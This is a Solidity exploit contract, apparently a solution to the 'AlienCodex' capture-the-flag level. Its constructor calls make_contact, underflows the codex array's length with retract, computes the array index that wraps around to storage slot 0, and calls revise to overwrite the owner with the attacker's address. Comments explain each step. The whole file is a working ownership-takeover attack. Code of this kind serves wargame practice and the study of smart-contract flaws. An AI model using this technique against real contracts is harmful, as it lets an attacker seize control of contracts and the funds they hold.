// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

interface AlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract HAlienCodex {
    AlienCodex public alienCodex;
    uint256 public slot0Index;
    address attacker;

    constructor(address _alienCodex) public {
        attacker = msg.sender;
        alienCodex = AlienCodex(_alienCodex);
        //Set contact to true to pass modifier
        alienCodex.make_contact();
        //Trigger undeflow of array length, such that array length is max (2**256-1)
        alienCodex.retract();
        //Calculate index of array that gives access to memory slot 1
        /*
            if last (max) slot is 2**256-1: slot 0 is last+1
            if last index of array == last slot: last index + 1 will overflow to slot 0
            if array length == 1 : array[0] will be at memory slot keccak256(1)
            if last slot has array index == 2**256-1 - uint(keccak256(1)) : then slot 0 can be accessed from array index 2**256-1 - uint(keccak256(1)) + 1
        */
        uint256 x = 1;
        uint256 y = 256;
        uint256 z = 2;
        slot0Index = z**y - uint256(keccak256(abi.encodePacked(x)));
        //Call revise to change slot 0 value (owner) to attacker address
        bytes32 attackerAddressAsBytes32 = bytes32(uint256(uint160(attacker)));
        alienCodex.revise(slot0Index, attackerAddressAsBytes32);
    }
}
